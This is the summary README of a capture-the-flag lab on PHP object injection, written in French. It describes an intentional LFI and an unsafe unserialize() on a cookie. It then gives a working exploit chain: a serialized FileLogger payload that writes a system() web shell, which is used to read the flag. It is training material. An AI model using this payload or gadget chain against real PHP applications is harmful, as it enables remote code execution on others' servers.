# CTF-5: PHP Object Injection - Résumé Final

## ✅ Configuration Simplifiée

Le challenge a été simplifié pour une récupération du flag directe :

### Architecture avant
```
web (Apache + PHP) → internal-vault (Alpine) → /flag.txt
```

### Architecture après
```
web (Apache + PHP) → /flag.txt
RCE (via shell.php) → cat /flag.txt
```

## 📂 Structure du projet

```
CTF-5-php-object-injection/
├── index.php              # Portail principal + LFI volontaire
├── classes.php            # UserSession & FileLogger (gadget chain)
├── Dockerfile             # Build image avec /flag.txt
├── docker-compose.yml     # Service web uniquement
├── README.md              # Documentation générale
├── WALKTHROUGH.md         # Guide d'exploitation détaillé
├── EXPLOIT_GUIDE.md       # Guide rapide (copie-coller)
└── logs/                  # Répertoire pour les logs
```

## 🎯 Flux d'exploitation simplifié

### 1. Découverte
```bash
curl -s http://localhost:8005/ 
# → Indice visible après 3 secondes ou dans HTML
```

### 2. Reconnaissance
```bash
curl -s 'http://localhost:8005/index.php?source=classes'
# → Code source révélé
```

### 3. Exploitation
```bash
# Créer le payload
PAYLOAD=$(docker exec ctf5-php-injection php -r '
class FileLogger {
    public $logFile; public $message;
    public function __construct($f, $m) {
        $this->logFile = $f; $this->message = $m;
    }
}
$obj = new FileLogger("/var/www/html/shell.php", "<?php system(\$_GET[\"cmd\"]); ?>");
echo base64_encode(serialize($obj));
')

# Injecter
curl 'http://localhost:8005/index.php' -H "Cookie: session_data=$PAYLOAD"

# Exploiter
curl 'http://localhost:8005/shell.php?cmd=cat%20/flag.txt'
# → FLAG{PHP_Object_Injection_Lab_2025}
```

## 🔑 Points clés

| Aspect | Détail |
|--------|--------|
| **Vulnérabilité 1** | LFI via `?source=` (piste intentionnelle) |
| **Vulnérabilité 2** | `unserialize()` sur cookie non sécurisé |
| **Gadget Chain** | `FileLogger::__destruct()` → `file_put_contents()` |
| **Impact** | RCE complète |
| **Flag** | `/flag.txt` (accessible en tant que www-data) |
| **Difficulty** | Intermédiaire (exploitation PHP avancée) |

## ✨ Changements effectués

- ❌ Suppression de `internal-vault` (container Alpine inutile)
- ✅ Flag stocké directement dans `/flag.txt` du container web
- ✅ Récupération simplifiée (juste `cat /flag.txt` via RCE)
- ✅ Documentation mise à jour (3 guides maintenant)
- ✅ Dockerfile optimisé (une seule image PHP)

## 🚀 Démarrage

```bash
cd CTF-5-php-object-injection
docker-compose up --build
# Service disponible sur http://localhost:8005
```

## 📝 Fichiers de documentation

### README.md
- Vue d'ensemble du challenge
- Architecture simplifiée
- Commandes rapides d'exploitation

### WALKTHROUGH.md  
- Guide complet étape par étape
- Explication de chaque vulnérabilité
- Variantes et avancées

### EXPLOIT_GUIDE.md
- Guide pour attaquants (pas d'accès Docker)
- Commandes prêtes à copier-coller
- Validation de chaque étape

---

**CTF-5 est maintenant prêt pour l'utilisation en production ! 🎉**
